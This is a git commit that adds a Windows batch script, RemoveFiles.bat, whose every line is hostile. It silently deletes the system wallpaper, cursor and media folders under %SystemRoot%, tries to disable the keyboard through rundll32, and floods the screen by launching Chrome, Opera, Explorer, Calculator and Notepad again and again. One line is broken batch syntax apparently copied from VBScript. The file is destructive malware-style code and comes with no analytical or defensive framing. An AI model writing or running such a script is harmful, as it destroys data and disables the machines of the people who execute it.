32593b0515e7b014c170f5fc3ad032934da5fdea
He1Zen <68460974+mishakorzik@users.noreply.github.com>
2022-05-16 22:03:22 +0300

    Create RemoveFiles.bat

---
+++ RemoveFiles.bat
@@ -0,0 +1,32 @@
+del "%SystemRoot%\Web\Wallpaper" /q >nul
+t.run"ipconfig"
+start chrome
+start chrome
+rundll32 keyboard,disable
+start opera
+start explorer
+start calculator
+start calendar
+start chrome
+start calculator
+start notepad
+del "%SystemRoot%\Cursors\*.*" >nul
+start chrome
+start chrome
+start opera
+start explorer
+start calculator
+start calendar
+start chrome
+start calculator
+start notepad
+start chrome
+start chrome
+start opera
+start explorer
+start calculator
+start calendar
+start chrome
+start calculator
+start notepad
+del "%SystemRoot%\Media" /q >nul
